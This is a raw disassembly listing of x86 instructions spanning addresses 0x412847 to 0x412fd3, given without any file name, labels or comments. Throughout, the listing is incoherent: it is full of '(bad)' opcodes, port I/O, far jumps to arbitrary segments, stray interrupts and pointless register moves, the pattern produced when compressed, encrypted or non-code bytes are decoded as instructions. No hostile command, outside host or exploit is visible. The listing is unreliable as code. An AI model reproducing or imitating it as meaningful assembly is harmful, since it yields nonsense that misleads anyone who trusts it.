  412847:	mov    dh,0x9b
  412849:	push   edx
  41284a:	push   edi
  41284b:	ds iret 
  41284d:	mov    ds:0x79f582d6,eax
  412852:	xchg   BYTE PTR [ecx+esi*2],ch
  412855:	push   esi
  412856:	xor    ebx,ebp
  412858:	(bad)
  41285b:	mov    BYTE PTR [ecx],ch
  41285d:	fidiv  DWORD PTR [ecx+0x1375aa04]
  412863:	dec    ebp
  412864:	cmp    BYTE PTR [edx],ch
  412866:	inc    edi
  412867:	xor    al,0x67
  412869:	inc    ebx
  41286a:	fsub   QWORD PTR [ecx-0x1d61c657]
  412870:	retf   
  412871:	cli    
  412872:	lods   al,BYTE PTR ds:[esi]
  412873:	ds push ebp
  412875:	(bad)  
  412877:	mov    esi,0x6508d740
  41287c:	daa    
  41287d:	test   eax,0x7f5ce081
  412882:	idiv   BYTE PTR [edx+0x16185b29]
  412888:	pop    es
  412889:	cmp    BYTE PTR [eax],bl
  41288b:	lahf   
  41288c:	rcr    ebx,1
  41288e:	cwde   
  41288f:	jmp    0xa509111a
  412894:	lods   al,BYTE PTR ds:[esi]
  412895:	test   BYTE PTR [ebx+0x50ce2a1e],0x75
  41289c:	imul   esp,esp,0x7c
  41289f:	dec    edx
  4128a0:	dec    esp
  4128a1:	cmp    DWORD PTR [esi],ecx
  4128a3:	inc    ecx
  4128a4:	or     DWORD PTR [edi+0x4d],eax
  4128a7:	pop    edi
  4128a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a9:	es inc ecx
  4128ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128ac:	push   0xffffffeb
  4128ae:	lock ds adc al,0x3
  4128b2:	mov    bh,0xa6
  4128b4:	add    BYTE PTR [esi],cl
  4128b6:	leave  
  4128b7:	adc    eax,0xef1982bf
  4128bc:	pop    es
  4128bd:	jmp    0x827901cd
  4128c2:	out    dx,eax
  4128c3:	lock gs ins BYTE PTR es:[edi],dx
  4128c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128c7:	sub    edx,0xb91452de
  4128cd:	push   esp
  4128ce:	sahf   
  4128cf:	imul   esi,DWORD PTR [edi-0x4832af6a],0x4a
  4128d6:	in     al,dx
  4128d7:	ins    BYTE PTR es:[edi],dx
  4128d8:	lods   al,BYTE PTR ds:[esi]
  4128d9:	arpl   WORD PTR [esi+0x64],di
  4128dc:	sti    
  4128dd:	xchg   edi,eax
  4128de:	jnp    0x4128a1
  4128e0:	sbb    BYTE PTR [edi+edx*2],0x78
  4128e4:	add    DWORD PTR [edi],esi
  4128e6:	and    edx,ecx
  4128e8:	test   BYTE PTR [edx+0x6095c5ee],cl
  4128ee:	xor    bh,BYTE PTR [edx+ebp*8+0x69]
  4128f2:	mov    ebp,0x38a1d870
  4128f7:	mov    bh,0x66
  4128f9:	cmp    eax,DWORD PTR [eax+esi*8]
  4128fc:	cmp    al,0xa5
  4128fe:	jb     0x4128ea
  412900:	dec    BYTE PTR [ebx]
  412902:	and    DWORD PTR [edx-0x5dd284f7],edx
  412908:	gs ja  0x41292e
  41290b:	pop    ebp
  41290c:	neg    BYTE PTR [esi+0x4cbcf4c9]
  412912:	pop    ss
  412913:	dec    ecx
  412914:	scas   al,BYTE PTR es:[edi]
  412915:	mov    ah,0xf7
  412917:	int    0x20
  412919:	mov    ebx,ebx
  41291b:	in     al,0x84
  41291d:	ficomp WORD PTR [eax+0x4d]
  412920:	jne    0x4128f1
  412922:	or     dh,BYTE PTR [esi+0x7c]
  412925:	fsubr  DWORD PTR [ebx]
  412927:	adc    dh,BYTE PTR [edi-0x38054f4a]
  41292d:	xor    dh,ch
  41292f:	mov    gs,ebp
  412931:	fs dec ebx
  412933:	mov    dh,0x97
  412935:	xchg   esi,ecx
  412937:	icebp  
  412938:	lock enter 0xe8f2,0x9a
  41293d:	lock sub BYTE PTR [esp+ebx*8],bh
  412941:	adc    dl,dh
  412943:	sbb    esi,DWORD PTR [ebp+0x12575403]
  412949:	mov    edi,0x43231647
  41294e:	jecxz  0x41296d
  412950:	lock xchg ebp,eax
  412952:	(bad)  
  412953:	aam    0xb4
  412955:	mov    esp,0x298adb57
  41295a:	mov    ebx,0xecc20f9e
  41295f:	shr    BYTE PTR [esi+0x7c906699],cl
  412965:	jmp    0xafdee1f9
  41296a:	adc    al,0x70
  41296c:	ja     0x412999
  41296e:	dec    DWORD PTR [esi+0x715c8a94]
  412974:	pushf  
  412975:	add    DWORD PTR [eax],eax
  412977:	pop    ebx
  412978:	push   0x6916b873
  41297d:	in     al,0x96
  41297f:	jg     0x4129c3
  412981:	dec    eax
  412982:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412984:	xor    al,BYTE PTR [ebx+0x51]
  412987:	cmc    
  412988:	pushf  
  412989:	ret    0x3fe9
  41298c:	mov    bl,0xe3
  41298e:	sub    ah,ch
  412990:	in     al,0xb7
  412992:	adc    eax,0x6c27fd65
  412997:	inc    edi
  412998:	mov    eax,ds:0x5a29b4c9
  41299d:	cmp    DWORD PTR [ebp+0x654ec6f8],esi
  4129a3:	lea    edi,[ebp-0x7]
  4129a6:	jmp    0x4129ad
  4129a8:	out    dx,eax
  4129a9:	shl    DWORD PTR [ebp-0x6c252d57],cl
  4129af:	stos   DWORD PTR es:[edi],eax
  4129b0:	ins    DWORD PTR es:[edi],dx
  4129b1:	sbb    DWORD PTR [esi-0x644e31fe],edx
  4129b7:	push   0x1c570a4f
  4129bc:	xchg   esi,eax
  4129bd:	add    DWORD PTR [ecx],esp
  4129bf:	mov    eax,ds:0x83ceae60
  4129c4:	mov    al,0x26
  4129c6:	xlat   BYTE PTR ds:[ebx]
  4129c7:	je     0x41299d
  4129c9:	mov    ecx,DWORD PTR [ebx]
  4129cb:	inc    ebp
  4129cc:	mov    cl,0x70
  4129ce:	lods   al,BYTE PTR ds:[esi]
  4129cf:	stos   BYTE PTR es:[edi],al
  4129d0:	or     ecx,DWORD PTR [ecx+0x40]
  4129d3:	das    
  4129d4:	nop
  4129d5:	inc    ecx
  4129d6:	inc    esp
  4129d7:	jle    0x412a26
  4129d9:	xchg   esp,eax
  4129da:	sbb    DWORD PTR [edx-0x67501c3a],esp
  4129e0:	call   FWORD PTR [ebp+0x4e]
  4129e3:	adc    al,0xac
  4129e5:	dec    eax
  4129e6:	sar    DWORD PTR [ecx],cl
  4129e8:	sar    DWORD PTR [edi],0xd8
  4129eb:	mov    dl,0xc8
  4129ed:	add    dh,BYTE PTR [eax-0x69f32793]
  4129f3:	lods   al,BYTE PTR ds:[esi]
  4129f4:	notrack call edi
  4129f7:	mov    eax,ds:0x797e9431
  4129fc:	mov    ah,0x88
  4129fe:	cmp    DWORD PTR [ebx],edx
  412a00:	add    ah,BYTE PTR [edi+0x6c]
  412a03:	add    bh,BYTE PTR [ecx+0x9c5d6b3]
  412a09:	aaa    
  412a0a:	inc    edi
  412a0b:	pusha  
  412a0c:	inc    esi
  412a0d:	out    0x7b,eax
  412a0f:	cdq    
  412a10:	cs repnz push edx
  412a13:	test   DWORD PTR [ebp-0x5c],eax
  412a16:	sbb    eax,0x233680b
  412a1b:	out    0x8b,al
  412a1d:	(bad)  
  412a1e:	ret    0x465a
  412a21:	cs push ebp
  412a23:	out    dx,eax
  412a24:	in     al,dx
  412a25:	xor    BYTE PTR [edx+0x3ac8864c],bl
  412a2b:	sar    BYTE PTR [edi],1
  412a2d:	add    ch,BYTE PTR [ebp-0x6c]
  412a30:	ud2    
  412a32:	mov    bh,0x9a
  412a34:	pop    eax
  412a35:	hlt    
  412a36:	xchg   ebx,eax
  412a37:	cld    
  412a38:	retf   
  412a39:	mov    bl,dl
  412a3b:	(bad)
  412a40:	test   DWORD PTR [edx-0x41d2e3f9],0xc1e3577d
  412a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a4b:	imul   esp,DWORD PTR [eax],0xff7a10af
  412a51:	popf   
  412a52:	sbb    eax,0x90cd4e8e
  412a57:	cwde   
  412a58:	add    cl,0x80
  412a5b:	jmp    0x2d528ebb
  412a60:	add    edi,esi
  412a62:	fcom   st(7)
  412a64:	xor    al,0xdc
  412a66:	sbb    bh,BYTE PTR [esi]
  412a68:	pop    ebx
  412a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a6a:	sub    al,0x77
  412a6c:	inc    ebx
  412a6d:	or     bl,BYTE PTR [eax-0x1f]
  412a70:	cs or  al,0x9a
  412a73:	fisub  WORD PTR [edx]
  412a75:	or     al,0x27
  412a78:	inc    esp
  412a79:	mov    dl,0x2f
  412a7b:	sahf   
  412a7c:	nop
  412a7d:	or     al,0x21
  412a7f:	mov    eax,0x55729ca7
  412a84:	imul   esp,DWORD PTR [esi+edx*8-0x1c],0xda522226
  412a8c:	mov    bh,0xc7
  412a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a8f:	dec    eax
  412a90:	sbb    al,0x22
  412a92:	pop    ds
  412a93:	and    al,0xc5
  412a95:	or     ch,BYTE PTR [eax-0x1f]
  412a98:	pop    ss
  412a99:	mov    ah,0xf6
  412a9b:	rcl    ebp,cl
  412a9d:	js     0x412a72
  412a9f:	xchg   edi,eax
  412aa0:	repnz and DWORD PTR [ebp-0x73],edx
  412aa4:	call   DWORD PTR [ebx]
  412aa6:	xor    DWORD PTR [ebx+0x61],esp
  412aa9:	cmp    BYTE PTR [ebp+0x6],bl
  412aac:	cmp    edx,DWORD PTR [edi-0x62]
  412aaf:	xor    al,BYTE PTR [ecx]
  412ab1:	push   edi
  412ab2:	retf   
  412ab3:	mov    esi,ebx
  412ab5:	and    DWORD PTR [esi+0x1a],esp
  412ab8:	arpl   WORD PTR [ecx-0x13368282],bx
  412abe:	leave  
  412abf:	jle    0x412afd
  412ac1:	push   0xa
  412ac3:	stos   DWORD PTR es:[edi],eax
  412ac4:	inc    eax
  412ac5:	inc    ecx
  412ac6:	sub    al,bh
  412ac8:	mov    WORD PTR [esp+ebx*2],ss
  412acb:	mov    cl,0x44
  412acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ace:	lea    eax,[edi]
  412ad0:	and    eax,0x7ca541e6
  412ad5:	adc    bh,BYTE PTR gs:[edx]
  412ad8:	into   
  412ad9:	fistp  WORD PTR [ebp-0xdcb9163]
  412adf:	jbe    0x412aa7
  412ae1:	xchg   edi,eax
  412ae2:	jmp    0x5864:0xe19c092a
  412ae9:	pusha  
  412aea:	mul    BYTE PTR [ebx+eiz*4]
  412aed:	mov    ebx,eax
  412aef:	call   0x93f6a909
  412af4:	jbe    0x412b70
  412af6:	rcl    BYTE PTR [esp+edx*1],1
  412af9:	sub    eax,0xf00bf8a
  412afe:	dec    esi
  412aff:	xchg   ebx,eax
  412b00:	cld    
  412b01:	push   cs
  412b02:	push   ecx
  412b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b04:	dec    ebx
  412b05:	add    ch,ch
  412b07:	cdq    
  412b08:	call   0x4827:0x934aa5b7
  412b0f:	loope  0x412a9d
  412b11:	popf   
  412b12:	stos   DWORD PTR es:[edi],eax
  412b13:	rcl    BYTE PTR [edi+0x44],1
  412b16:	shl    DWORD PTR [edx+ecx*1-0x148a72b6],0xd9
  412b1e:	into   
  412b1f:	jl     0x412b9e
  412b21:	push   esp
  412b22:	push   ecx
  412b23:	cld    
  412b24:	fnstenv [ecx+0x5415c5f]
  412b2a:	in     al,dx
  412b2b:	mov    ds:0x3398cb9e,eax
  412b30:	rcl    esi,0x49
  412b33:	cdq    
  412b34:	cwde   
  412b35:	or     eax,0xbaeb038d
  412b3a:	mov    eax,gs:0x65ef0e86
  412b40:	mov    edi,0x10e26c09
  412b45:	mov    cl,0x6
  412b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b48:	mov    dh,0xcb
  412b4a:	aaa    
  412b4b:	out    dx,al
  412b4c:	dec    esp
  412b4d:	pop    eax
  412b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b4f:	add    esp,edx
  412b51:	sbb    ebx,DWORD PTR [ecx-0x3eda507d]
  412b57:	clc    
  412b58:	and    al,0x5f
  412b5a:	rol    BYTE PTR [ecx+0x3f],1
  412b5d:	sbb    DWORD PTR [edi],esp
  412b5f:	jl     0x412bc6
  412b61:	sbb    DWORD PTR [edi-0x22],0x30
  412b65:	mov    ds:0x7940dcc9,al
  412b6a:	mov    DWORD PTR [edi+0x4b],esi
  412b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b6e:	lea    edi,[ecx+0x39080989]
  412b74:	xlat   BYTE PTR ds:[ebx]
  412b75:	imul   ebp,DWORD PTR [edi],0xf6ff4724
  412b7b:	push   esp
  412b7c:	mov    BYTE PTR [edi+ebx*8+0x62],dl
  412b80:	xchg   ebp,eax
  412b81:	(bad)  [ebp+0x36]
  412b84:	xchg   dx,ax
  412b86:	sub    al,0x61
  412b88:	mov    ds:0xfe002120,al
  412b8d:	stc    
  412b8e:	xchg   BYTE PTR [eax],ah
  412b90:	adc    dh,BYTE PTR [ebx+eax*4]
  412b93:	sub    eax,0xbe18db1e
  412b98:	inc    edx
  412b99:	lea    eax,[ebp+0x6c]
  412b9c:	int3   
  412b9d:	mov    eax,0xa9def59d
  412ba2:	out    0xdc,al
  412ba4:	cmp    al,ch
  412ba6:	cs ret 0xee75
  412baa:	dec    ebx
  412bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bac:	mov    bh,0x83
  412bae:	mov    dl,0xa3
  412bb0:	std    
  412bb1:	out    0x8c,al
  412bb3:	lods   eax,DWORD PTR ds:[esi]
  412bb4:	mov    WORD PTR [edi*1-0x373426b8],fs
  412bbb:	stos   DWORD PTR es:[edi],eax
  412bbc:	stc    
  412bbd:	xchg   ebp,eax
  412bbe:	arpl   WORD PTR ss:[esp],si
  412bc2:	sbb    ebx,DWORD PTR [edx+0x4f]
  412bc5:	jbe    0x412b55
  412bc7:	xor    DWORD PTR [ebp+0x71993c43],edx
  412bcd:	xor    al,0x9b
  412bcf:	outs   dx,DWORD PTR ds:[esi]
  412bd0:	mov    ecx,0x914f4d66
  412bd5:	daa    
  412bd6:	into   
  412bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bd9:	ins    DWORD PTR es:[edi],dx
  412bda:	xchg   esi,eax
  412bdb:	sti    
  412bdc:	shl    BYTE PTR [eax-0x3f1e008e],cl
  412be2:	sub    DWORD PTR ds:0xeaf12838,edx
  412be8:	sbb    DWORD PTR [ecx],0x2fda2e34
  412bee:	dec    ebx
  412bef:	shl    BYTE PTR [ebx+0x57a6fe0],cl
  412bf5:	sub    BYTE PTR [ebp+0x2a91844d],bl
  412bfb:	push   cs
  412bfc:	in     al,dx
  412bfd:	lock cwde 
  412bff:	repnz or BYTE PTR [edi-0x51],bl
  412c03:	add    eax,0x519eb45d
  412c08:	adc    BYTE PTR [edi],dh
  412c0a:	mov    eax,ds:0xa2e3d435
  412c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c10:	fistp  WORD PTR [edi-0xd]
  412c13:	or     ecx,ecx
  412c15:	jmp    0x3bc8531b
  412c1a:	mov    ecx,es
  412c1c:	iret   
  412c1d:	out    dx,eax
  412c1e:	test   edi,esp
  412c20:	(bad)  
  412c22:	mov    bl,0xd6
  412c24:	sub    al,0x67
  412c26:	push   edx
  412c27:	push   edx
  412c28:	xchg   edi,eax
  412c29:	leave  
  412c2a:	xor    eax,edx
  412c2c:	test   DWORD PTR [ebx-0x7e],edi
  412c2f:	int    0xb5
  412c31:	int    0xc
  412c33:	sub    eax,0x53ee609f
  412c38:	enter  0x1d01,0x2c
  412c3c:	mov    al,0x7f
  412c3e:	pop    edx
  412c3f:	neg    BYTE PTR [ebx-0x4c]
  412c42:	in     eax,dx
  412c43:	stc    
  412c44:	jecxz  0x412c75
  412c46:	in     eax,dx
  412c47:	rcr    BYTE PTR [eax+0x5c60345],1
  412c4d:	call   0x7e62:0x2e6f43da
  412c54:	sbb    al,0x76
  412c56:	xchg   edx,eax
  412c57:	sub    al,0xac
  412c59:	pop    eax
  412c5a:	xchg   BYTE PTR [edx-0x70],al
  412c5d:	sbb    eax,0xff46ac66
  412c62:	or     BYTE PTR [edi-0x2c0d00b8],cl
  412c68:	mov    cl,0x72
  412c6a:	leave  
  412c6b:	shl    esi,1
  412c6d:	test   al,0x99
  412c6f:	aam    0x3a
  412c71:	or     DWORD PTR [eax+edx*1-0x589ce566],0x724d47da
  412c7c:	mov    edx,ebx
  412c7e:	addr16 pop ecx
  412c80:	mov    esp,0xc560feee
  412c85:	pop    eax
  412c86:	push   edx
  412c87:	adc    ebx,DWORD PTR [edx+0x69b6f2da]
  412c8d:	cmp    eax,0xe31290fc
  412c92:	(bad)  
  412c93:	int    0xb9
  412c95:	sti    
  412c96:	sub    bl,BYTE PTR [edi]
  412c98:	adc    dl,ah
  412c9a:	xchg   edi,eax
  412c9b:	scas   eax,DWORD PTR es:[edi]
  412c9c:	push   ebx
  412c9d:	pusha  
  412c9e:	or     BYTE PTR [ebp-0x3e503ae9],0xe7
  412ca5:	xchg   esi,eax
  412ca6:	sti    
  412ca7:	jg     0x412c35
  412ca9:	pop    ecx
  412caa:	fiadd  WORD PTR ds:0xbb2bf774
  412cb0:	jle    0x412cda
  412cb2:	scas   eax,DWORD PTR es:[edi]
  412cb3:	dec    edx
  412cb4:	mov    ah,0x24
  412cb6:	cdq    
  412cb7:	xchg   ebp,eax
  412cb8:	cli    
  412cb9:	fsub   DWORD PTR [edi+ecx*1-0x80]
  412cbd:	sbb    DWORD PTR [edx-0x18bd1fe5],0x23
  412cc4:	adc    edi,DWORD PTR [edx-0x28de1e9e]
  412cca:	test   bl,ah
  412ccc:	xor    ecx,esp
  412cce:	cmp    eax,0xc5d6b6e0
  412cd3:	outs   dx,BYTE PTR ds:[esi]
  412cd4:	out    dx,eax
  412cd5:	push   ebx
  412cd6:	dec    edi
  412cd7:	adc    eax,0x2c7b8a98
  412cdc:	pop    esp
  412cdd:	xor    DWORD PTR [edi-0x39b071bf],edi
  412ce3:	push   0xffffffaa
  412ce5:	arpl   WORD PTR [ebp-0x158a6d76],si
  412ceb:	popa   
  412cec:	sar    ebp,1
  412cee:	xchg   ebp,ecx
  412cf0:	ds mov dl,0xbe
  412cf3:	push   0xffffffdf
  412cf5:	pushf  
  412cf6:	sar    esp,cl
  412cf8:	pop    ecx
  412cf9:	ins    BYTE PTR es:[edi],dx
  412cfa:	(bad)  
  412cfc:	mov    WORD PTR [edx-0x3e],ds
  412cff:	add    eax,0x5a046b8d
  412d04:	sub    al,0xf8
  412d06:	sub    eax,0xd633a49a
  412d0b:	sub    al,0xd8
  412d0d:	fldenv [ebx-0x33e5a041]
  412d13:	std    
  412d14:	mov    edx,0x23c74501
  412d19:	jle    0x412d6b
  412d1b:	cmp    DWORD PTR [esi],ebx
  412d1d:	sbb    eax,0xa57799e
  412d22:	inc    edi
  412d23:	je     0x412cef
  412d25:	dec    edi
  412d26:	cdq    
  412d27:	test   eax,0xb69318c3
  412d2c:	aas    
  412d2d:	ret    
  412d2e:	ins    DWORD PTR es:[edi],dx
  412d2f:	jae    0x412d8e
  412d31:	sbb    ecx,DWORD PTR [eax+0x2a]
  412d34:	dec    ecx
  412d35:	lahf   
  412d36:	mul    DWORD PTR ds:0x1502d8e6
  412d3c:	shl    DWORD PTR [esp+ebp*8-0xded9def],cl
  412d43:	sub    eax,0x9794591
  412d48:	test   DWORD PTR [eax],ebp
  412d4a:	push   esp
  412d4b:	out    dx,eax
  412d4c:	push   ebp
  412d4d:	adc    al,BYTE PTR [edx+eiz*8+0x1c]
  412d51:	dec    ebx
  412d52:	jecxz  0x412d6d
  412d54:	push   ebx
  412d55:	(bad)  
  412d57:	pop    esi
  412d58:	ins    BYTE PTR es:[edi],dx
  412d59:	push   0x60d6e377
  412d5e:	mov    DWORD PTR [edx],eax
  412d60:	dec    edi
  412d61:	xchg   BYTE PTR [edx-0x2ad36ef5],ch
  412d67:	sub    eax,0x21f5e58f
  412d6c:	stc    
  412d6d:	and    al,bl
  412d6f:	int    0xe3
  412d71:	mov    al,0x97
  412d73:	sub    ch,BYTE PTR [ebp+0x17]
  412d76:	push   ds
  412d77:	test   ah,0xb
  412d7a:	mov    bl,0x52
  412d7c:	dec    esi
  412d7d:	adc    DWORD PTR [edx+0x59],0x7bad4452
  412d84:	(bad)  
  412d85:	sub    bh,ch
  412d87:	aas    
  412d88:	test   bl,cl
  412d8a:	and    eax,0x4ce7821a
  412d8f:	bound  ebx,QWORD PTR [eax]
  412d91:	fsub   DWORD PTR cs:[ebx+0x42]
  412d95:	cld    
  412d96:	leave  
  412d97:	ins    DWORD PTR es:[edi],dx
  412d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d9a:	sbb    BYTE PTR ds:[edx+0x49070457],dl
  412da1:	pop    ebx
  412da2:	pusha  
  412da3:	xchg   edi,eax
  412da4:	add    eax,0xbccb7b44
  412da9:	dec    BYTE PTR [ecx-0x6]
  412dac:	push   edx
  412dad:	add    eax,DWORD PTR [ebx]
  412daf:	stc    
  412db0:	call   0x3520:0x9a2fc7ba
  412db7:	adc    DWORD PTR [edi],edi
  412db9:	inc    ecx
  412dba:	cmc    
  412dbb:	test   DWORD PTR [edx-0x11],esi
  412dbe:	shl    BYTE PTR [eax-0x21],0x36
  412dc2:	inc    ecx
  412dc3:	cli    
  412dc4:	fisubr DWORD PTR [edi+ebp*2-0x60421e77]
  412dcb:	mov    ds:0xa4f8bad8,eax
  412dd0:	jp     0x412e13
  412dd2:	mov    ah,0xe9
  412dd4:	add    al,0xd8
  412dd6:	shl    BYTE PTR ds:0xcb349383,cl
  412ddc:	sbb    eax,0x1d6a6f9e
  412de1:	lods   eax,DWORD PTR ds:[esi]
  412de2:	lds    ebp,FWORD PTR [ebx-0x5a1296ee]
  412de8:	push   edx
  412de9:	test   al,0xef
  412deb:	(bad)  
  412dec:	lods   eax,DWORD PTR ds:[esi]
  412ded:	mov    edx,0x9150926d
  412df2:	dec    ecx
  412df3:	(bad)  
  412df4:	jae    0x412e16
  412df6:	test   al,0x2c
  412df8:	or     BYTE PTR [edi+0x1d],0x85
  412dfc:	sar    DWORD PTR [ebp+0x5b],1
  412dff:	jle    0x412e6f
  412e01:	and    eax,0x4f2ee908
  412e06:	xchg   edi,eax
  412e07:	adc    dl,cl
  412e09:	sahf   
  412e0a:	gs or  eax,edx
  412e0d:	push   ds
  412e0e:	or     dh,0x49
  412e11:	retf   0x5036
  412e14:	jl     0x412e83
  412e16:	pop    eax
  412e17:	add    al,0xd6
  412e19:	das    
  412e1a:	rol    BYTE PTR [ebx],1
  412e1c:	xchg   esi,eax
  412e1d:	xor    BYTE PTR [eax+0x45164381],ch
  412e23:	push   ss
  412e24:	ds std 
  412e26:	mov    ebx,0xf56deb75
  412e2b:	stos   DWORD PTR es:[edi],eax
  412e2c:	clc    
  412e2d:	(bad)  
  412e2e:	adc    BYTE PTR [ebx],bh
  412e30:	shl    BYTE PTR [edx],0x2d
  412e33:	inc    ebx
  412e34:	jae    0x412e3d
  412e36:	mov    ecx,0xc312f702
  412e3b:	stos   BYTE PTR es:[edi],al
  412e3c:	inc    ecx
  412e3d:	mov    esp,?
  412e3f:	iret   
  412e40:	mov    al,0xc3
  412e42:	sbb    ecx,eax
  412e44:	popa   
  412e45:	jl     0x412e6d
  412e47:	out    0x37,eax
  412e49:	jns    0x412dcb
  412e4b:	mov    ds:0x7ccf85f2,eax
  412e50:	ins    DWORD PTR es:[edi],dx
  412e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e52:	cmp    al,BYTE PTR [esp+ebx*4+0x69]
  412e56:	xor    ecx,DWORD PTR [eax-0x71f4a1e2]
  412e5c:	stos   BYTE PTR es:[edi],al
  412e5d:	(bad)  
  412e5e:	hlt    
  412e5f:	ret    
  412e60:	std    
  412e61:	ret    0x190b
  412e64:	aaa    
  412e65:	push   ebp
  412e66:	ss add cl,dh
  412e69:	loop   0x412e0e
  412e6b:	std    
  412e6c:	mov    esp,0x1ebcf03c
  412e71:	add    eax,0xdd68fcd
  412e76:	jo     0x412e58
  412e78:	sub    al,0xc8
  412e7a:	inc    esi
  412e7b:	jmp    FWORD PTR [edi]
  412e7d:	mov    bh,BYTE PTR [ebx-0x1d]
  412e80:	outs   dx,BYTE PTR ds:[esi]
  412e81:	(bad)  
  412e82:	push   cs
  412e83:	jmp    0x412e9c
  412e85:	scas   al,BYTE PTR es:[edi]
  412e86:	adc    eax,0x577c6815
  412e8b:	out    dx,al
  412e8c:	popf   
  412e8d:	lds    eax,FWORD PTR [edi-0x777d253c]
  412e93:	int3   
  412e94:	cmp    al,0x2
  412e96:	cdq    
  412e97:	repz add DWORD PTR [esi+ebp*2],ecx
  412e9b:	imul   edx,DWORD PTR [ecx+0x3b68ebc3],0x35
  412ea2:	scas   eax,DWORD PTR es:[edi]
  412ea3:	fld    DWORD PTR [ebx]
  412ea5:	jmp    0x1e39:0xf209578b
  412eac:	pop    ss
  412ead:	cmp    esi,esi
  412eaf:	jo     0x412ed6
  412eb1:	ins    DWORD PTR es:[edi],dx
  412eb2:	lock loopne 0x412eb0
  412eb5:	stos   DWORD PTR es:[edi],eax
  412eb6:	or     cl,ah
  412eb8:	fmul   DWORD PTR [edi]
  412eba:	xchg   ecx,eax
  412ebb:	in     eax,0x6c
  412ebd:	outs   dx,BYTE PTR ds:[esi]
  412ebe:	xor    BYTE PTR [edi-0x2aec4c3],bh
  412ec4:	push   0xecc53cbc
  412ec9:	int    0x4c
  412ecb:	inc    edx
  412ecc:	fadd   st,st(4)
  412ece:	mov    eax,ds:0x1be2651b
  412ed3:	mov    ah,0xa2
  412ed5:	pop    ecx
  412ed6:	sub    al,0x40
  412ed8:	jne    0x412f49
  412eda:	das    
  412edb:	les    ebp,FWORD PTR [edx-0x36]
  412ede:	enter  0xb6de,0x1f
  412ee2:	addr16 mov eax,0x5a5221ca
  412ee8:	and    esi,DWORD PTR [esi+0x64]
  412eeb:	pop    ebx
  412eec:	mov    DWORD PTR [edi],0x27fae9e0
  412ef2:	adc    eax,DWORD PTR [eax+esi*8+0x1ff4f449]
  412ef9:	adc    eax,DWORD PTR [eax]
  412efb:	dec    ebp
  412efc:	jle    0x412ea3
  412efe:	jo     0x412ea1
  412f00:	mov    al,ds:0x4401d995
  412f05:	pop    ss
  412f06:	xor    cl,ah
  412f08:	dec    ecx
  412f09:	or     DWORD PTR [ebx-0x6],esp
  412f0c:	fadd   DWORD PTR [edi]
  412f0e:	xor    eax,0xa7c7ef8b
  412f13:	inc    edi
  412f14:	cs jbe 0x412ec3
  412f17:	inc    ecx
  412f18:	mov    edi,edx
  412f1a:	sub    ah,BYTE PTR [edi+0x4fc24824]
  412f20:	xor    bl,BYTE PTR [edi+0x164337b6]
  412f26:	fldln2 
  412f28:	test   bh,dh
  412f2a:	out    0x31,eax
  412f2c:	xor    eax,DWORD PTR [esi-0x89b84ff]
  412f32:	jecxz  0x412ef3
  412f34:	pop    ecx
  412f35:	iret   
  412f36:	cmc    
  412f37:	inc    ebp
  412f38:	adc    al,0x59
  412f3a:	iret   
  412f3b:	and    eax,0x9dbf7a10
  412f40:	or     al,0x49
  412f42:	mov    edi,0xf9511639
  412f47:	pop    edi
  412f48:	pop    esi
  412f49:	sbb    DWORD PTR [esi],ecx
  412f4b:	jmp    0x52e0:0xea64e8dd
  412f52:	push   esi
  412f53:	push   ss
  412f54:	adc    eax,0xbadf85cc
  412f59:	adc    al,0xad
  412f5b:	in     al,0x85
  412f5d:	or     cl,ch
  412f5f:	clc    
  412f60:	mov    edx,0xfd4cfe2f
  412f65:	dec    ecx
  412f66:	cmp    edi,ebx
  412f68:	jmp    0x412f11
  412f6a:	stos   DWORD PTR es:[edi],eax
  412f6b:	inc    esp
  412f6c:	test   cl,ah
  412f6e:	pop    ecx
  412f6f:	in     al,dx
  412f70:	jmp    0x412f66
  412f72:	xlat   BYTE PTR ds:[ebx]
  412f73:	xor    al,0x14
  412f75:	into   
  412f76:	ss ja  0x412f91
  412f79:	mov    eax,ds:0x7a164e08
  412f7e:	pop    eax
  412f7f:	jg     0x412fa0
  412f81:	cmp    al,0xdd
  412f83:	loope  0x412f8c
  412f85:	add    al,0x14
  412f87:	test   al,0x0
  412f89:	mov    ch,0xe0
  412f8b:	int    0x43
  412f8d:	daa    
  412f8e:	pop    eax
  412f8f:	in     eax,dx
  412f90:	mov    DWORD PTR [edx+eiz*1-0x2215bd35],0x821e5519
  412f9b:	and    dl,BYTE PTR ds:0x4bd1fdcc
  412fa1:	add    al,0x1b
  412fa3:	cmc    
  412fa4:	stos   DWORD PTR es:[edi],eax
  412fa5:	fist   WORD PTR [edx+0x56f911ae]
  412fab:	xchg   esp,eax
  412fac:	sub    ch,BYTE PTR [ebx+0x5989afde]
  412fb2:	scas   eax,DWORD PTR es:[edi]
  412fb3:	lock jno 0x412f64
  412fb6:	(bad)  
  412fb7:	xor    eax,0x40c59ce2
  412fbc:	pop    eax
  412fbd:	rcl    BYTE PTR [edi+0x7c],cl
  412fc0:	mov    ebx,0xf3c36fb7
  412fc5:	(bad)  
  412fc6:	jnp    0x412f89
  412fc8:	or     edi,eax
  412fca:	adc    BYTE PTR [edx],bh
  412fcc:	and    esp,DWORD PTR [ebx+ebx*8-0x9]
  412fd0:	dec    ebp
  412fd1:	fdiv   QWORD PTR [esi]
  412fd3:	mov    al,ds:0x3ace824b
